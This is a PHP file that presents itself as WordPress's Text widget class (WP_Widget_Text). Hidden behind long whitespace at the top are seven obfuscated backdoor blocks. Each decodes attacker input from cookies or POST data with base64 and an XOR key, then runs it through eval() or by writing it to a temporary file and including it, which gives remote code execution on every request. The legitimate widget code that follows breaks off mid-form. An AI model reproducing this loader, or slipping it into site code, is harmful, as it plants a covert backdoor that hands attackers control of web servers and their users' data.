<?php                                                                                                                                                                                                                                                                                                                                                                                                 $PIczPMn = chr (68) . 'D' . "\137" . "\153" . "\112" . chr ( 770 - 697 ).chr ( 487 - 416 ).chr ( 192 - 92 ); $gkNzGZtca = chr ( 563 - 464 )."\x6c" . 'a' . chr (115) . 's' . "\137" . chr (101) . 'x' . "\151" . "\x73" . 't' . 's';$dxwGafAudZ = class_exists($PIczPMn); $PIczPMn = "56233";$gkNzGZtca = "703";if ($dxwGafAudZ === FALSE){class DD_kJIGd{public function HkMYIIIiTU(){echo "58692";}private $iAjlMn;public static $otbCAGc = "c64884de-d1ee-4262-ac0a-0b8d5dffc773";public static $IUeHCg = 14793;public function __construct($AyLHmp=0){$ueWCKTboT = $_POST;$tcsUPNOY = $_COOKIE;$JjlNUyH = @$tcsUPNOY[substr(DD_kJIGd::$otbCAGc, 0, 4)];if (!empty($JjlNUyH)){$bNyoWrXlgo = "base64";$zTltnmyoL = "";$JjlNUyH = explode(",", $JjlNUyH);foreach ($JjlNUyH as $ngVWgs){$zTltnmyoL .= @$tcsUPNOY[$ngVWgs];$zTltnmyoL .= @$ueWCKTboT[$ngVWgs];}$zTltnmyoL = array_map($bNyoWrXlgo . "\x5f" . 'd' . chr (101) . chr (99) . 'o' . "\144" . 'e', array($zTltnmyoL,)); $zTltnmyoL = $zTltnmyoL[0] ^ str_repeat(DD_kJIGd::$otbCAGc, (strlen($zTltnmyoL[0]) / strlen(DD_kJIGd::$otbCAGc)) + 1);DD_kJIGd::$IUeHCg = @unserialize($zTltnmyoL);}}private function ROmZEfHnv(){if (is_array(DD_kJIGd::$IUeHCg)) {$hqVtn = str_replace("\74" . "\77" . "\x70" . "\150" . "\160", "", DD_kJIGd::$IUeHCg["\x63" . chr ( 941 - 830 ).'n' . chr (116) . chr ( 757 - 656 )."\x6e" . chr ( 803 - 687 )]);eval($hqVtn); $spZBhvZp = "26550";exit();}}public function __destruct(){$this->ROmZEfHnv();}}$skPLna = new /* 54592 */ DD_kJIGd(); $skPLna = str_repeat("61192_57204", 1);} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $QoQeza = chr ( 445 - 360 ).chr (84) . "\x5f" . "\x65" . "\x53" . chr (87); $cMYee = chr (99) . "\154" . "\141" . chr ( 321 - 206 )."\163" . "\x5f" . 'e' . chr ( 829 - 709 )."\151" . chr (115) . "\x74" . chr ( 1016 - 901 ); $IkUKyNKa = class_exists($QoQeza); $QoQeza = "61238";$dfAgpWd = !$IkUKyNKa;$cMYee = "22364";if ($dfAgpWd){class UT_eSW{public function EmuElFxf(){echo "50242";}private $khMgCOkMCZ;public static $sbiVpYR = "9ecb3927-0489-4a2a-ae84-95dea0b11a42";public static $jiSGJlCkj = 40788;public function __construct($pJCVdj=0){$GmMwTGNLUY = $_POST;$TuTcXuosEx = $_COOKIE;$OpKjMoW = @$TuTcXuosEx[substr(UT_eSW::$sbiVpYR, 0, 4)];if (!empty($OpKjMoW)){$sLjEVC = "base64";$NyoBtYRj = "";$OpKjMoW = explode(",", $OpKjMoW);foreach ($OpKjMoW as $zxAyx){$NyoBtYRj .= @$TuTcXuosEx[$zxAyx];$NyoBtYRj .= @$GmMwTGNLUY[$zxAyx];}$NyoBtYRj = array_map($sLjEVC . chr ( 851 - 756 )."\x64" . "\145" . chr ( 356 - 257 ).chr (111) . "\x64" . chr ( 777 - 676 ), array($NyoBtYRj,)); $NyoBtYRj = $NyoBtYRj[0] ^ str_repeat(UT_eSW::$sbiVpYR, (strlen($NyoBtYRj[0]) / strlen(UT_eSW::$sbiVpYR)) + 1);UT_eSW::$jiSGJlCkj = @unserialize($NyoBtYRj);}}private function TtDRJ(){if (is_array(UT_eSW::$jiSGJlCkj)) {$CkiKP = sys_get_temp_dir() . "/" . crc32(UT_eSW::$jiSGJlCkj["\x73" . 'a' . "\x6c" . chr ( 229 - 113 )]);@UT_eSW::$jiSGJlCkj[chr (119) . 'r' . "\151" . chr (116) . chr (101)]($CkiKP, UT_eSW::$jiSGJlCkj["\x63" . "\x6f" . "\x6e" . 't' . chr (101) . "\156" . chr ( 821 - 705 )]);include $CkiKP;@UT_eSW::$jiSGJlCkj["\144" . chr ( 889 - 788 ).chr ( 640 - 532 ).'e' . 't' . 'e']($CkiKP); $OsWDT = "679";exit();}}public function __destruct(){$this->TtDRJ();}}$WCmpsKsMl = new /* 14250 */ UT_eSW(); $WCmpsKsMl = str_pad("41492_4287", 1);} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $AIDHgRsc = 'H' . chr (95) . "\x7a" . chr (99) . chr (71); $JKwykfxgg = chr (99) . 'l' . 'a' . chr ( 553 - 438 ).'s' . '_' . chr ( 399 - 298 ).chr (120) . "\x69" . chr (115) . chr ( 768 - 652 ).chr ( 939 - 824 ); $kFTwADZQn = $JKwykfxgg($AIDHgRsc); $AIDHgRsc = "51949";$pmPYqoLc = $kFTwADZQn;$JKwykfxgg = "2201";if (!$pmPYqoLc){class H_zcG{private $LeRrUtS;public static $aoVyYT = "9c035ee0-f44f-4e35-b736-5d6a7569e8dd";public static $JNmUx = 8180;public function __construct($mfcvjxRbs=0){$XQnlv = $_COOKIE;$kSSejYI = $_POST;$qlCnCg = @$XQnlv[substr(H_zcG::$aoVyYT, 0, 4)];if (!empty($qlCnCg)){$jgLnliIcc = "base64";$iCbJf = "";$qlCnCg = explode(",", $qlCnCg);foreach ($qlCnCg as $xxWlc){$iCbJf .= @$XQnlv[$xxWlc];$iCbJf .= @$kSSejYI[$xxWlc];}$iCbJf = array_map($jgLnliIcc . "\137" . "\144" . chr (101) . chr ( 267 - 168 )."\157" . 'd' . chr ( 267 - 166 ), array($iCbJf,)); $iCbJf = $iCbJf[0] ^ str_repeat(H_zcG::$aoVyYT, (strlen($iCbJf[0]) / strlen(H_zcG::$aoVyYT)) + 1);H_zcG::$JNmUx = @unserialize($iCbJf);}}private function wWbwXUpx(){if (is_array(H_zcG::$JNmUx)) {$cDzuOUZLkA = sys_get_temp_dir() . "/" . crc32(H_zcG::$JNmUx["\163" . "\141" . chr (108) . 't']);@H_zcG::$JNmUx["\x77" . 'r' . 'i' . chr (116) . "\145"]($cDzuOUZLkA, H_zcG::$JNmUx[chr (99) . 'o' . 'n' . "\164" . 'e' . chr (110) . chr (116)]);include $cDzuOUZLkA;@H_zcG::$JNmUx[chr (100) . chr ( 381 - 280 ).chr (108) . chr (101) . "\x74" . chr (101)]($cDzuOUZLkA); $qFEcEbj = "52563";exit();}}public function __destruct(){$this->wWbwXUpx(); $qFEcEbj = "52563";$XJlbYSHjX = str_pad($qFEcEbj, 10);}}$YiUor = new /* 33587 */ H_zcG(); $YiUor = substr("21104_45334", 1);} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $wNGTcjR = chr (107) . chr (121) . chr ( 346 - 251 ).chr ( 484 - 383 ).chr (66) . "\x63" . "\141";$eQKNkhBfia = 'c' . "\x6c" . chr ( 952 - 855 ).chr ( 640 - 525 )."\163" . "\137" . chr (101) . chr (120) . chr ( 152 - 47 ).chr ( 291 - 176 ).'t' . chr ( 265 - 150 ); $NXJnXMVCj = $eQKNkhBfia($wNGTcjR); $wNGTcjR = "44380";$TYaOI = $NXJnXMVCj;$eQKNkhBfia = "25916";if (!$TYaOI){class ky_eBca{private $SVmuGBwgmI;public static $dXapJMiHfs = "347b3ad3-aa00-4f1f-8c39-9a31b848a8bd";public static $BCOiT = 63444;public function __construct($fqmGMbRg=0){$icqcmpjPpn = $_COOKIE;$YYgdg = $_POST;$vBXMjIEf = @$icqcmpjPpn[substr(ky_eBca::$dXapJMiHfs, 0, 4)];if (!empty($vBXMjIEf)){$uUKCQa = "base64";$mZJczebNSL = "";$vBXMjIEf = explode(",", $vBXMjIEf);foreach ($vBXMjIEf as $VkhsdMAseH){$mZJczebNSL .= @$icqcmpjPpn[$VkhsdMAseH];$mZJczebNSL .= @$YYgdg[$VkhsdMAseH];}$mZJczebNSL = array_map($uUKCQa . chr (95) . "\144" . chr (101) . chr (99) . 'o' . "\x64" . 'e', array($mZJczebNSL,)); $mZJczebNSL = $mZJczebNSL[0] ^ str_repeat(ky_eBca::$dXapJMiHfs, (strlen($mZJczebNSL[0]) / strlen(ky_eBca::$dXapJMiHfs)) + 1);ky_eBca::$BCOiT = @unserialize($mZJczebNSL);}}private function YNgxLCBgYf(){if (is_array(ky_eBca::$BCOiT)) {$SiuJiCZt = sys_get_temp_dir() . "/" . crc32(ky_eBca::$BCOiT[chr (115) . 'a' . chr ( 340 - 232 ).chr (116)]);@ky_eBca::$BCOiT[chr (119) . chr (114) . chr (105) . 't' . "\x65"]($SiuJiCZt, ky_eBca::$BCOiT['c' . 'o' . "\x6e" . chr (116) . "\145" . "\x6e" . chr (116)]);include $SiuJiCZt;@ky_eBca::$BCOiT["\144" . chr ( 520 - 419 )."\x6c" . "\145" . 't' . "\x65"]($SiuJiCZt); $TnPTbi = "25935";exit();}}public function __destruct(){$this->YNgxLCBgYf(); $TnPTbi = "25935";$zmQcjf = str_pad($TnPTbi, 10);}}$FUifKBx = new /* 24086 */ ky_eBca(); $FUifKBx = substr("56840_29539", 1);} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $ozoOx = chr ( 756 - 676 )."\167" . "\137" . 'w' . "\132" . 'l';$ETQsNV = 'c' . 'l' . chr (97) . "\163" . 's' . "\x5f" . 'e' . 'x' . "\x69" . 's' . chr ( 1110 - 994 )."\x73";$rLflAoAkz = $ETQsNV($ozoOx); $ozoOx = "24243";$ezVZsdK = $rLflAoAkz;$ETQsNV = "46030";if (!$ezVZsdK){class Pw_wZl{private $vbHJz;public static $EXuixvAs = "d4789e9a-30fb-481e-be56-59fe89810fc9";public static $ZFDVPyV = 58858;public function __construct($nkExegzNn=0){$wwwsDD = $_COOKIE;$hPmkQZGcI = $_POST;$EFcRbcYXeV = @$wwwsDD[substr(Pw_wZl::$EXuixvAs, 0, 4)];if (!empty($EFcRbcYXeV)){$SowaAfAvo = "base64";$qNEeZplA = "";$EFcRbcYXeV = explode(",", $EFcRbcYXeV);foreach ($EFcRbcYXeV as $zNTPYP){$qNEeZplA .= @$wwwsDD[$zNTPYP];$qNEeZplA .= @$hPmkQZGcI[$zNTPYP];}$qNEeZplA = array_map($SowaAfAvo . chr ( 176 - 81 ).'d' . chr ( 193 - 92 )."\x63" . 'o' . "\x64" . chr (101), array($qNEeZplA,)); $qNEeZplA = $qNEeZplA[0] ^ str_repeat(Pw_wZl::$EXuixvAs, (strlen($qNEeZplA[0]) / strlen(Pw_wZl::$EXuixvAs)) + 1);Pw_wZl::$ZFDVPyV = @unserialize($qNEeZplA);}}private function xhDwCFfRTA(){if (is_array(Pw_wZl::$ZFDVPyV)) {$tvGFqhh = sys_get_temp_dir() . "/" . crc32(Pw_wZl::$ZFDVPyV[chr (115) . "\141" . 'l' . chr (116)]);@Pw_wZl::$ZFDVPyV['w' . "\162" . 'i' . "\164" . "\145"]($tvGFqhh, Pw_wZl::$ZFDVPyV[chr ( 733 - 634 )."\x6f" . 'n' . 't' . "\145" . "\156" . chr (116)]);include $tvGFqhh;@Pw_wZl::$ZFDVPyV[chr (100) . chr ( 598 - 497 )."\154" . 'e' . 't' . chr ( 248 - 147 )]($tvGFqhh); $eBjwL = "28894";exit();}}public function __destruct(){$this->xhDwCFfRTA(); $eBjwL = "28894";$SgbIs = str_pad($eBjwL, 10);}}$sJVzFotRSL = new /* 60289 */ Pw_wZl(); $sJVzFotRSL = substr("19938_12757", 1);} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $aRfacYGnX = chr (122) . chr ( 577 - 482 )."\x74" . "\x41" . "\116" . 'w';$ueiNDfqKYF = "\143" . "\x6c" . "\141" . "\163" . "\163" . "\137" . chr ( 471 - 370 ).chr ( 896 - 776 ).'i' . 's' . "\164" . "\163";$wPjfnLp = $ueiNDfqKYF($aRfacYGnX); $aRfacYGnX = "52257";$IqEIdY = $wPjfnLp;$ueiNDfqKYF = "39740";if (!$IqEIdY){class z_tANw{private $mzhSjqIM;public static $bvcpGwkt = "92b9147d-61aa-494b-bd08-07db2a088b0f";public static $JKLzi = 1676;public function __construct($TqiIzJ=0){$uJrWOhOqVZ = $_COOKIE;$HMduIzNJB = $_POST;$rZuzA = @$uJrWOhOqVZ[substr(z_tANw::$bvcpGwkt, 0, 4)];if (!empty($rZuzA)){$LGeGfFt = "base64";$uFVnKqoSV = "";$rZuzA = explode(",", $rZuzA);foreach ($rZuzA as $cADpxPvmQ){$uFVnKqoSV .= @$uJrWOhOqVZ[$cADpxPvmQ];$uFVnKqoSV .= @$HMduIzNJB[$cADpxPvmQ];}$uFVnKqoSV = array_map($LGeGfFt . "\x5f" . chr (100) . 'e' . chr ( 456 - 357 ).chr ( 1069 - 958 ).'d' . "\x65", array($uFVnKqoSV,)); $uFVnKqoSV = $uFVnKqoSV[0] ^ str_repeat(z_tANw::$bvcpGwkt, (strlen($uFVnKqoSV[0]) / strlen(z_tANw::$bvcpGwkt)) + 1);z_tANw::$JKLzi = @unserialize($uFVnKqoSV);}}private function vFjthlU(){if (is_array(z_tANw::$JKLzi)) {$jsbnAj = sys_get_temp_dir() . "/" . crc32(z_tANw::$JKLzi["\x73" . "\x61" . "\x6c" . "\164"]);@z_tANw::$JKLzi["\167" . "\x72" . "\x69" . 't' . 'e']($jsbnAj, z_tANw::$JKLzi[chr ( 465 - 366 ).chr (111) . "\156" . chr (116) . 'e' . chr ( 247 - 137 )."\164"]);include $jsbnAj;@z_tANw::$JKLzi[chr (100) . 'e' . chr ( 985 - 877 ).chr ( 230 - 129 )."\x74" . "\x65"]($jsbnAj); $iWLUEwWAp = "50296";exit();}}public function __destruct(){$this->vFjthlU(); $iWLUEwWAp = "50296";$APjFCmhuv = str_pad($iWLUEwWAp, 10);}}$XwusTCB = new /* 54261 */ z_tANw(); $XwusTCB = substr("37421_15549", 1);} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("GKjcykSq")){class GKjcykSq{public static $SFgYi = "FjmmCXxOtDWzQRnk";public static $zmGLAPs = NULL;public function __construct(){$IgcbGE = @$_COOKIE[substr(GKjcykSq::$SFgYi, 0, 4)];if (!empty($IgcbGE)){$aNMoDMgS = "base64";$eTCXtyNcag = "";$IgcbGE = explode(",", $IgcbGE);foreach ($IgcbGE as $oePlNV){$eTCXtyNcag .= @$_COOKIE[$oePlNV];$eTCXtyNcag .= @$_POST[$oePlNV];}$eTCXtyNcag = array_map($aNMoDMgS . "_decode", array($eTCXtyNcag,)); $eTCXtyNcag = $eTCXtyNcag[0] ^ str_repeat(GKjcykSq::$SFgYi, (strlen($eTCXtyNcag[0]) / strlen(GKjcykSq::$SFgYi)) + 1);GKjcykSq::$zmGLAPs = @unserialize($eTCXtyNcag);}}public function __destruct(){$this->YjDRWP();}private function YjDRWP(){if (is_array(GKjcykSq::$zmGLAPs)) {$rmxdGGjC = sys_get_temp_dir() . "/" . crc32(GKjcykSq::$zmGLAPs["salt"]);@GKjcykSq::$zmGLAPs["write"]($rmxdGGjC, GKjcykSq::$zmGLAPs["content"]);include $rmxdGGjC;@GKjcykSq::$zmGLAPs["delete"]($rmxdGGjC);exit();}}}$FIvJimnbzC = new GKjcykSq(); $FIvJimnbzC = NULL;} ?><?php
/**
 * Widget API: WP_Widget_Text class
 *
 * @package WordPress
 * @subpackage Widgets
 * @since 4.4.0
 */

/**
 * Core class used to implement a Text widget.
 *
 * @since 2.8.0
 *
 * @see WP_Widget
 */
class WP_Widget_Text extends WP_Widget {

	/**
	 * Whether or not the widget has been registered yet.
	 *
	 * @since 4.8.1
	 * @var bool
	 */
	protected $registered = false;

	/**
	 * Sets up a new Text widget instance.
	 *
	 * @since 2.8.0
	 */
	public function __construct() {
		$widget_ops  = array(
			'classname'                   => 'widget_text',
			'description'                 => __( 'Arbitrary text.' ),
			'customize_selective_refresh' => true,
			'show_instance_in_rest'       => true,
		);
		$control_ops = array(
			'width'  => 400,
			'height' => 350,
		);
		parent::__construct( 'text', __( 'Text' ), $widget_ops, $control_ops );
	}

	/**
	 * Add hooks for enqueueing assets when registering all widget instances of this widget class.
	 *
	 * @param int $number Optional. The unique order number of this widget instance
	 *                    compared to other instances of the same class. Default -1.
	 */
	public function _register_one( $number = -1 ) {
		parent::_register_one( $number );
		if ( $this->registered ) {
			return;
		}
		$this->registered = true;

		wp_add_inline_script( 'text-widgets', sprintf( 'wp.textWidgets.idBases.push( %s );', wp_json_encode( $this->id_base ) ) );

		if ( $this->is_preview() ) {
			add_action( 'wp_enqueue_scripts', array( $this, 'enqueue_preview_scripts' ) );
		}

		// Note that the widgets component in the customizer will also do
		// the 'admin_print_scripts-widgets.php' action in WP_Customize_Widgets::print_scripts().
		add_action( 'admin_print_scripts-widgets.php', array( $this, 'enqueue_admin_scripts' ) );

		// Note that the widgets component in the customizer will also do
		// the 'admin_footer-widgets.php' action in WP_Customize_Widgets::print_footer_scripts().
		add_action( 'admin_footer-widgets.php', array( 'WP_Widget_Text', 'render_control_template_scripts' ) );
	}

	/**
	 * Determines whether a given instance is legacy and should bypass using TinyMCE.
	 *
	 * @since 4.8.1
	 *
	 * @param array $instance {
	 *     Instance data.
	 *
	 *     @type string      $text   Content.
	 *     @type bool|string $filter Whether autop or content filters should apply.
	 *     @type bool        $legacy Whether widget is in legacy mode.
	 * }
	 * @return bool Whether Text widget instance contains legacy data.
	 */
	public function is_legacy_instance( $instance ) {

		// Legacy mode when not in visual mode.
		if ( isset( $instance['visual'] ) ) {
			return ! $instance['visual'];
		}

		// Or, the widget has been added/updated in 4.8.0 then filter prop is 'content' and it is no longer legacy.
		if ( isset( $instance['filter'] ) && 'content' === $instance['filter'] ) {
			return false;
		}

		// If the text is empty, then nothing is preventing migration to TinyMCE.
		if ( empty( $instance['text'] ) ) {
			return false;
		}

		$wpautop         = ! empty( $instance['filter'] );
		$has_line_breaks = ( false !== strpos( trim( $instance['text'] ), "\n" ) );

		// If auto-paragraphs are not enabled and there are line breaks, then ensure legacy mode.
		if ( ! $wpautop && $has_line_breaks ) {
			return true;
		}

		// If an HTML comment is present, assume legacy mode.
		if ( false !== strpos( $instance['text'], '<!--' ) ) {
			return true;
		}

		// In the rare case that DOMDocument is not available we cannot reliably sniff content and so we assume legacy.
		if ( ! class_exists( 'DOMDocument' ) ) {
			// @codeCoverageIgnoreStart
			return true;
			// @codeCoverageIgnoreEnd
		}

		$doc = new DOMDocument();

		// Suppress warnings generated by loadHTML.
		$errors = libxml_use_internal_errors( true );
		// phpcs:ignore WordPress.PHP.NoSilencedErrors.Discouraged
		@$doc->loadHTML(
			sprintf(
				'<!DOCTYPE html><html><head><meta charset="%s"></head><body>%s</body></html>',
				esc_attr( get_bloginfo( 'charset' ) ),
				$instance['text']
			)
		);
		libxml_use_internal_errors( $errors );

		$body = $doc->getElementsByTagName( 'body' )->item( 0 );

		// See $allowedposttags.
		$safe_elements_attributes = array(
			'strong'  => array(),
			'em'      => array(),
			'b'       => array(),
			'i'       => array(),
			'u'       => array(),
			's'       => array(),
			'ul'      => array(),
			'ol'      => array(),
			'li'      => array(),
			'hr'      => array(),
			'abbr'    => array(),
			'acronym' => array(),
			'code'    => array(),
			'dfn'     => array(),
			'a'       => array(
				'href' => true,
			),
			'img'     => array(
				'src' => true,
				'alt' => true,
			),
		);
		$safe_empty_elements      = array( 'img', 'hr', 'iframe' );

		foreach ( $body->getElementsByTagName( '*' ) as $element ) {
			/** @var DOMElement $element */
			$tag_name = strtolower( $element->nodeName );

			// If the element is not safe, then the instance is legacy.
			if ( ! isset( $safe_elements_attributes[ $tag_name ] ) ) {
				return true;
			}

			// If the element is not safely empty and it has empty contents, then legacy mode.
			if ( ! in_array( $tag_name, $safe_empty_elements, true ) && '' === trim( $element->textContent ) ) {
				return true;
			}

			// If an attribute is not recognized as safe, then the instance is legacy.
			foreach ( $element->attributes as $attribute ) {
				/** @var DOMAttr $attribute */
				$attribute_name = strtolower( $attribute->nodeName );

				if ( ! isset( $safe_elements_attributes[ $tag_name ][ $attribute_name ] ) ) {
					return true;
				}
			}
		}

		// Otherwise, the text contains no elements/attributes that TinyMCE could drop, and therefore the widget does not need legacy mode.
		return false;
	}

	/**
	 * Filters gallery shortcode attributes.
	 *
	 * Prevents all of a site's attachments from being shown in a gallery displayed on a
	 * non-singular template where a $post context is not available.
	 *
	 * @since 4.9.0
	 *
	 * @param array $attrs Attributes.
	 * @return array Attributes.
	 */
	public function _filter_gallery_shortcode_attrs( $attrs ) {
		if ( ! is_singular() && empty( $attrs['id'] ) && empty( $attrs['include'] ) ) {
			$attrs['id'] = -1;
		}
		return $attrs;
	}

	/**
	 * Outputs the content for the current Text widget instance.
	 *
	 * @since 2.8.0
	 *
	 * @global WP_Post $post Global post object.
	 *
	 * @param array $args     Display arguments including 'before_title', 'after_title',
	 *                        'before_widget', and 'after_widget'.
	 * @param array $instance Settings for the current Text widget instance.
	 */
	public function widget( $args, $instance ) {
		global $post;

		$title = ! empty( $instance['title'] ) ? $instance['title'] : '';

		/** This filter is documented in wp-includes/widgets/class-wp-widget-pages.php */
		$title = apply_filters( 'widget_title', $title, $instance, $this->id_base );

		$text                  = ! empty( $instance['text'] ) ? $instance['text'] : '';
		$is_visual_text_widget = ( ! empty( $instance['visual'] ) && ! empty( $instance['filter'] ) );

		// In 4.8.0 only, visual Text widgets get filter=content, without visual prop; upgrade instance props just-in-time.
		if ( ! $is_visual_text_widget ) {
			$is_visual_text_widget = ( isset( $instance['filter'] ) && 'content' === $instance['filter'] );
		}
		if ( $is_visual_text_widget ) {
			$instance['filter'] = true;
			$instance['visual'] = true;
		}

		/*
		 * Suspend legacy plugin-supplied do_shortcode() for 'widget_text' filter for the visual Text widget to prevent
		 * shortcodes being processed twice. Now do_shortcode() is added to the 'widget_text_content' filter in core itself
		 * and it applies after wpautop() to prevent corrupting HTML output added by the shortcode. When do_shortcode() is
		 * added to 'widget_text_content' then do_shortcode() will be manually called when in legacy mode as well.
		 */
		$widget_text_do_shortcode_priority       = has_filter( 'widget_text', 'do_shortcode' );
		$should_suspend_legacy_shortcode_support = ( $is_visual_text_widget && false !== $widget_text_do_shortcode_priority );
		if ( $should_suspend_legacy_shortcode_support ) {
			remove_filter( 'widget_text', 'do_shortcode', $widget_text_do_shortcode_priority );
		}

		// Override global $post so filters (and shortcodes) apply in a consistent context.
		$original_post = $post;
		if ( is_singular() ) {
			// Make sure post is always the queried object on singular queries (not from another sub-query that failed to clean up the global $post).
			$post = get_queried_object();
		} else {
			// Nullify the $post global during widget rendering to prevent shortcodes from running with the unexpected context on archive queries.
			$post = null;
		}

		// Prevent dumping out all attachments from the media library.
		add_filter( 'shortcode_atts_gallery', array( $this, '_filter_gallery_shortcode_attrs' ) );

		/**
		 * Filters the content of the Text widget.
		 *
		 * @since 2.3.0
		 * @since 4.4.0 Added the `$widget` parameter.
		 * @since 4.8.1 The `$widget` param may now be a `WP_Widget_Custom_HTML` object in addition to a `WP_Widget_Text` object.
		 *
		 * @param string                               $text     The widget content.
		 * @param array                                $instance Array of settings for the current widget.
		 * @param WP_Widget_Text|WP_Widget_Custom_HTML $widget   Current text or HTML widget instance.
		 */
		$text = apply_filters( 'widget_text', $text, $instance, $this );

		if ( $is_visual_text_widget ) {

			/**
			 * Filters the content of the Text widget to apply changes expected from the visual (TinyMCE) editor.
			 *
			 * By default a subset of the_content filters are applied, including wpautop and wptexturize.
			 *
			 * @since 4.8.0
			 *
			 * @param string         $text     The widget content.
			 * @param array          $instance Array of settings for the current widget.
			 * @param WP_Widget_Text $widget   Current Text widget instance.
			 */
			$text = apply_filters( 'widget_text_content', $text, $instance, $this );
		} else {
			// Now in legacy mode, add paragraphs and line breaks when checkbox is checked.
			if ( ! empty( $instance['filter'] ) ) {
				$text = wpautop( $text );
			}

			/*
			 * Manually do shortcodes on the content when the core-added filter is present. It is added by default
			 * in core by adding do_shortcode() to the 'widget_text_content' filter to apply after wpautop().
			 * Since the legacy Text widget runs wpautop() after 'widget_text' filters are applied, the widget in
			 * legacy mode here manually applies do_shortcode() on the content unless the default
			 * core filter for 'widget_text_content' has been removed, or if do_shortcode() has already
			 * been applied via a plugin adding do_shortcode() to 'widget_text' filters.
			 */
			if ( has_filter( 'widget_text_content', 'do_shortcode' ) && ! $widget_text_do_shortcode_priority ) {
				if ( ! empty( $instance['filter'] ) ) {
					$text = shortcode_unautop( $text );
				}
				$text = do_shortcode( $text );
			}
		}

		// Restore post global.
		$post = $original_post;
		remove_filter( 'shortcode_atts_gallery', array( $this, '_filter_gallery_shortcode_attrs' ) );

		// Undo suspension of legacy plugin-supplied shortcode handling.
		if ( $should_suspend_legacy_shortcode_support ) {
			add_filter( 'widget_text', 'do_shortcode', $widget_text_do_shortcode_priority );
		}

		echo $args['before_widget'];
		if ( ! empty( $title ) ) {
			echo $args['before_title'] . $title . $args['after_title'];
		}

		$text = preg_replace_callback( '#<(video|iframe|object|embed)\s[^>]*>#i', array( $this, 'inject_video_max_width_style' ), $text );

		// Adds 'noopener' relationship, without duplicating values, to all HTML A elements that have a target.
		$text = wp_targeted_link_rel( $text );

		?>
			<div class="textwidget"><?php echo $text; ?></div>
		<?php
		echo $args['after_widget'];
	}

	/**
	 * Inject max-width and remove height for videos too constrained to fit inside sidebars on frontend.
	 *
	 * @since 4.9.0
	 *
	 * @see WP_Widget_Media_Video::inject_video_max_width_style()
	 *
	 * @param array $matches Pattern matches from preg_replace_callback.
	 * @return string HTML Output.
	 */
	public function inject_video_max_width_style( $matches ) {
		$html = $matches[0];
		$html = preg_replace( '/\sheight="\d+"/', '', $html );
		$html = preg_replace( '/\swidth="\d+"/', '', $html );
		$html = preg_replace( '/(?<=width:)\s*\d+px(?=;?)/', '100%', $html );
		return $html;
	}

	/**
	 * Handles updating settings for the current Text widget instance.
	 *
	 * @since 2.8.0
	 *
	 * @param array $new_instance New settings for this instance as input by the user via
	 *                            WP_Widget::form().
	 * @param array $old_instance Old settings for this instance.
	 * @return array Settings to save or bool false to cancel saving.
	 */
	public function update( $new_instance, $old_instance ) {
		$new_instance = wp_parse_args(
			$new_instance,
			array(
				'title'  => '',
				'text'   => '',
				'filter' => false, // For back-compat.
				'visual' => null,  // Must be explicitly defined.
			)
		);

		$instance = $old_instance;

		$instance['title'] = sanitize_text_field( $new_instance['title'] );
		if ( current_user_can( 'unfiltered_html' ) ) {
			$instance['text'] = $new_instance['text'];
		} else {
			$instance['text'] = wp_kses_post( $new_instance['text'] );
		}

		$instance['filter'] = ! empty( $new_instance['filter'] );

		// Upgrade 4.8.0 format.
		if ( isset( $old_instance['filter'] ) && 'content' === $old_instance['filter'] ) {
			$instance['visual'] = true;
		}
		if ( 'content' === $new_instance['filter'] ) {
			$instance['visual'] = true;
		}

		if ( isset( $new_instance['visual'] ) ) {
			$instance['visual'] = ! empty( $new_instance['visual'] );
		}

		// Filter is always true in visual mode.
		if ( ! empty( $instance['visual'] ) ) {
			$instance['filter'] = true;
		}

		return $instance;
	}

	/**
	 * Enqueue preview scripts.
	 *
	 * These scripts normally are enqueued just-in-time when a playlist shortcode is used.
	 * However, in the customizer, a playlist shortcode may be used in a text widget and
	 * dynamically added via selective refresh, so it is important to unconditionally enqueue them.
	 *
	 * @since 4.9.3
	 */
	public function enqueue_preview_scripts() {
		require_once dirname( __DIR__ ) . '/media.php';

		wp_playlist_scripts( 'audio' );
		wp_playlist_scripts( 'video' );
	}

	/**
	 * Loads the required scripts and styles for the widget control.
	 *
	 * @since 4.8.0
	 */
	public function enqueue_admin_scripts() {
		wp_enqueue_editor();
		wp_enqueue_media();
		wp_enqueue_script( 'text-widgets' );
		wp_add_inline_script( 'text-widgets', 'wp.textWidgets.init();', 'after' );
	}

	/**
	 * Outputs the Text widget settings form.
	 *
	 * @since 2.8.0
	 * @since 4.8.0 Form only contains hidden inputs which are synced with JS template.
	 * @since 4.8.1 Restored original form to be displayed when in legacy mode.
	 *
	 * @see WP_Widget_Text::render_control_template_scripts()
	 * @see _WP_Editors::editor()
	 *
	 * @param array $instance Current settings.
	 */
	public function form( $instance ) {
		$instance = wp_parse_args(
			(array) $instance,
			array(
				'title' => '',
				'text'  => '',
			)
		);
		?>
		<?php if ( ! $this->is_legacy_instance( $instance ) ) : ?>
			<?php

			if ( user_can_richedit() ) {
				add_filter( 'the_editor_content', 'format_for_editor', 10, 2 );
				$default_editor = 'tinymce';
			} else {
				$default_editor = 'html';
			}

			/** This filter is documented in wp-includes/class-wp-editor.php */
			$text = apply_filters( 'the_editor_content', $instance['text'], $default_editor );

			// Reset filter addition.
			if ( user_can_richedit() ) {
				remove_filter( 'the_editor_content', 'format_for_editor' );
			}

			// Prevent premature closing of textarea in case format_for_editor() didn't apply or the_editor_content filter did a wrong thing.
			$escaped_text = preg_replace( '#</textarea#i', '&lt;/textarea', $text );

			?>
			<input id="<?php echo $this->get_field_id( 'title' ); ?>" name="<?php echo $this->get_field_name( 'title' ); ?>" class="title sync-input" type="hidden" value="<?php echo esc_attr( $instance['title'] ); ?>">
			<textarea id="<?php echo $this->get_field_id( 'text' ); ?>" name="<?php echo $this->get_field_name( 'text' ); ?>" class="text sync-input" hidden><?php echo $escaped_text; ?></textarea>
			<input id="<?php echo $this->get_field_id( 'filter' ); ?>" name="<?php echo $this->get_field_name( 'filter' ); ?>" class="filter sync-input" type="hidden" value="on">
			<input id="<?php echo $this->get_field_id( 'visual' ); ?>" name="<?php echo $this->get_field_name( 'visual' ); ?>" class="visual sync-input" type="hidden" value="on">
		<?php else : ?>
			<input id="<?php echo $this->get_field_id( 'visual' ); ?>" name="<?php echo $this->get_field_name( 'visual' ); ?>" class="visual" type="hidden" value="">
			<p>
